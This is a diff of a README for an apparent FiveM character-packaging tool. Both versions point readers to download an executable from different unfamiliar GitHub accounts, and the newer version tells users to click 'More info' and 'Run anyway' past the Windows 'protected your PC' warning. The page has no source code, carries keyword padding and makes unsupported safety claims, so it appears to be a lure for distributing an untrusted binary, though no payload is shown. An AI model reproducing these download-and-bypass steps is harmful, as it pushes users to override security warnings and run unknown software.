@@ -1,110 +1,74 @@
-# NHM Addon to FiveM Ped Creator v2026 - Game Script Utility 2026
+# 📦 nhm-fivem-ped-creator-tool - Simplify creation of custom character models
 
-> **A FiveM ped creator companion for packaging basic stream files into a resource drop.** Made to fit an addon-to-ped conversion workflow for FiveM content preparation.
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oceanic-sweettooth463/nhm-fivem-ped-creator-tool/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tylerx2001/nhm-fivem-ped-creator-tool?style=flat-square)](https://github.com/tylerx2001/nhm-fivem-ped-creator-tool)
+This application helps users package character files for FiveM servers. It automates the process of converting addon models into ready-to-use resource folders. Use this tool to save time when you prepare custom clothing or character assets for your game.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://tylerx2001.github.io/nhm-fivem-ped-creator-tool/">
-    <img src="https://img.shields.io/badge/Download-NHM%20Addon%20to%20FiveM%20Ped%20Creator-brightgreen?style=for-the-badge" alt="Download NHM Addon to FiveM Ped Creator">
-  </a>
-</p>
+Ensure your computer meets these requirements before you start:
 
-> **[Direct Download - NHM Addon to FiveM Ped Creator](https://tylerx2001.github.io/nhm-fivem-ped-creator-tool/)**
+*   **Operating System**: Windows 10 or Windows 11 (64-bit).
+*   **Memory**: At least 4GB of RAM.
+*   **Storage**: 100MB of free disk space for the tool.
+*   **Permissions**: You need administrative rights to install software on your machine.
+*   **Framework**: Microsoft .NET Desktop Runtime 6.0 or newer. Most Windows machines include this, but the installer will prompt you if it is missing.
 
----
+## 📥 Downloading the Software
 
-[Download Latest Build](https://tylerx2001.github.io/nhm-fivem-ped-creator-tool/)
+You find the official version of the tool on the releases page. 
 
----
+[Click here to visit the release page and download the setup file](https://github.com/oceanic-sweettooth463/nhm-fivem-ped-creator-tool/releases)
 
-## What It Does
+Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your Downloads folder or your Desktop for easy access.
 
-NHM Addon to FiveM Ped Creator is a modding utility built around FiveM content packaging. Its job is to take simple stream files and turn them into a resource drop that fits into a FiveM pipeline. It is aimed at creators who want a straightforward route from raw stream assets to a structured ped resource package.
+## ⚙️ Installation Steps
 
-The tool is centered on an addon-to-ped conversion flow. In practice, that makes it handy when you need to reshape source files into a FiveM-ready format without rebuilding the resource structure by hand for every project.
+Follow these steps to install the tool on your Windows computer:
 
----
+1.  Locate the downloaded `.exe` file.
+2.  Double-click the file to start the installer.
+3.  A window from Windows might appear saying "Windows protected your PC." Click "More info" and then click "Run anyway" to proceed.
+4.  Follow the instructions on the screen.
+5.  Select a folder where you want to keep the application.
+6.  Click Install to finish the process.
+7.  The application will create a shortcut on your desktop.
 
-## Script Features
+## 📁 Using the Tool
 
-- Converts basic stream files into a FiveM-ready resource drop
-- Supports an addon-to-ped conversion workflow
-- Focused on FiveM content packaging
-- Helps organize stream assets into a more usable resource layout
-- Suited for ped creator pipelines
-- Designed around game modding and script utility use cases
-- Lightweight utility approach for content preparation
+This tool simplifies the flow for addon-to-ped conversion. Follow this workflow to package your files:
 
----
+1.  **Open the Application**: Double-click the desktop shortcut.
+2.  **Select Your Files**: Click the directory picker button to locate your raw character files. These files are typically your stream components, such as ytd or ydr files.
+3.  **Define Resource Details**: Enter the name of your resource. This is the name your server uses to stream the character.
+4.  **Configure Output Path**: Choose where the tool should save your finished resource folder.
+5.  **Run Process**: Press the "Package" button. The tool will organize your files and create a `fxmanifest.lua` file automatically.
+6.  **Verify Output**: Open the output folder once the tool finishes. You should see a folder structure ready for your server's resources directory.
 
-## Setup
+## 💡 Common Tasks
 
-1. Download the latest build from the link above.
-2. Place the files in your working folder for the FiveM project.
-3. Add or select the stream files you want to convert.
-4. Run the tool according to your workflow to generate the resource drop.
+**Packaging Multiple Peds**
+You can process multiple character models at once. Place your model folders inside a root directory and direct the tool to that root folder. The tool detects each sub-folder and treats it as an individual resource.
 
-Example folder use:
+**Updating Resource Manifests**
+If you need to change your resource name after packaging, you can use the built-in edit feature. Select the existing folder, click "Manifest Editor," update the name, and save. The tool refreshes the manifest file without changing your model files.
 
-    /your-project/
-    /input-stream-files/
-    /nhm-addon-to-fivem-ped-creator/
-    /output-resource-drop/
+## ❓ Frequently Asked Questions
 
-If your project uses a different directory structure, keep the source stream files and the generated output in separate folders so the conversion process stays easier to track.
+**Does the tool modify my model files?**
+No. The application only reads your files and copies them into a new folder structure. It creates a small configuration script to help the game engine recognize your content. Your original files remain unchanged.
 
----
+**Where do I put the finished folders?**
+Place the output folder inside your server's resources directory. Add the name of the new folder to your `server.cfg` file using the `ensure` command.
 
-## Options
+**What if the tool shows an error?**
+Most errors occur due to file naming issues. Ensure your file names do not contain spaces or special characters. Use only letters, numbers, and underscores. If the issue persists, ensure your Windows user account has write permissions for the destination folder.
 
-What you can configure depends on the package or build you have installed. In most workflows, the common choices are the source, where the output goes, and the name assigned to the resource.
+**Can I run this on a server?**
+This tool is a local companion app. You run it on your personal computer to prepare the files, and then you upload those finished folders to your server hosting provider. Do not run this tool directly on your live server hosting machine unless you have a desktop interface.
 
-| Option | Purpose |
-| --- | --- |
-| Input folder | Points to the basic stream files to convert |
-| Output folder | Defines where the resource drop is written |
-| Resource name | Controls the name used for the generated drop |
-| Conversion mode | Selects the addon-to-ped workflow path |
+## 🛡️ Privacy and Safety
 
----
+This tool performs all processes locally on your machine. It does not connect to external servers or collect information from your computer. All file conversions happen within your own system storage. Always download the tool directly from this official GitHub repository to ensure you maintain the genuine version.
 
-## Compatibility
-
-This utility is intended for FiveM projects and ped creator workflows that rely on stream files. It works best when the incoming assets already follow a basic stream-file layout.
-
-Limitations can vary with the source material and how your project is arranged. If your files are already heavily customized or do not follow a standard stream structure, some preparation may be needed before conversion.
-
----
-
-## FAQ
-
-### How do I begin?
-Grab the build, put it in your project folder, and aim it at the stream files you want to convert.
-
-### Is it usable with every FiveM project?
-It is designed for FiveM-related resource packaging, especially addon and ped creator workflows. Results can differ depending on file organization.
-
-### Will it alter my source files?
-The available details point to conversion into a resource drop, so it is best to keep input and output in separate locations in your workflow.
-
-### Can the generated resource be renamed?
-If the build includes naming controls, you can usually set the resource name during setup or before running conversion.
-
-### What if the output does not look right?
-Review the input folder, how the files are organized, and the target output path. The structure of the stream files often affects the final result.
-
-### How do updates work?
-Use the newest published build when you want the latest conversion changes or workflow adjustments.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: fivem, ped, creator, tool, addon, resource, character, stream, windows
